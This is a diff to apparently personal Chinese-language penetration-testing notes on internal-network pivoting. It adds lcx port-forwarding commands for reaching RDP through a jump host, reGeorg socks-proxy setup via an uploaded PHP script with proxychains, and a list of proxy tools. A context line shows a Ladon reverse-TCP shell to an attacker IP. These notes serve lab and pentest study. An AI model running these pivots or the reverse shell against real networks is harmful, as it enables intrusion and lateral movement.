@@ -2,6 +2,7 @@ https://gitee.com/windyjxx/projects
 
 
 ## 内网穿透
+[干货|通过边界代理一路打到三层内网+后渗透通用手法](https://mp.weixin.qq.com/s/uDPCkbWcp-upMH3r2x1WMA)
 [Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
 frp/nps
 
@@ -14,12 +15,29 @@ nc
 
 [内网渗透中隧道渗透技术](https://blog.csdn.net/qq_17204441/article/details/88834324)
 [内网渗透之主机出网OR不出网隧道搭建](https://www.freebuf.com/articles/web/255801.html)
+
+
+边界代理
+* 代理类别：HTTP代理、socks代理、telnet代理、ssl代理
+* 代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)
+
 ### lcx
 ```bash
-靶机执行
-Lcx.exe -slave 192.168.100.3 12345 192.168.100.128 3389 (把攻击机的12346数据 传递给靶机的3389)
-攻击机执行
-Lcx.exe -listen 12345 12346 (把攻击机12345端口接收到的数据转发到哦12346端口)
+# 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt 
+lcx.exe -tran 1234 192.168.10.10 3389
+
+# 反向转发
+# 示例1 kali机以Win7为跳板机登录Win10
+## Win7上执行: 将9000 转发到 9001
+## lcx.exe -listen SourcePort  TargetPort
+lcx.exe -listen 9000 9001
+
+## 将win10 3389 转发到 Win7: 9000 端口，在Win10上执行：
+## lcx.exe -slave RemoteHost RemotePort LocalHost LocalPort
+lcx.exe -slave 192.168.10.10 9000 127.0.0.1 3389
+
+## kali连接9001：
+rdesktop 192.168.10.10:9001
 ```
 ### nc
 [nc端口转发](https://ssooking.github.io/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/)
@@ -150,7 +168,7 @@ Ladon ReverseTcp 192.168.1.8 4444 meter
 # proxy
 ## proxychains
 
-只对tcp流量有效，所以udp和icmp都是不能代理转发的。
+只对tcp流量有效，所以udp和icmp都是不能代理转发的。 有ping之类的扫描工具要关掉
 
 ## frp
 
@@ -340,6 +358,20 @@ server_port = 8888  # socks服务使用的端口
 run
 ```shell
 tsocks curl http://myexternalip.com &
+```
+## regeorg
+pip install安装
+
+上传php到服务器
+```sh
+python reGeorgSocksProxy.py -u 靶机reGeorg脚本地址 -p 本地监听端口
+
+vi /etc/proxychains.conf
+# 添加
+socks5 127.0.0.1 本地监听端口
+:wq
+
+proxychains 命令
 ```
 # 远程桌面
 xfreerdp
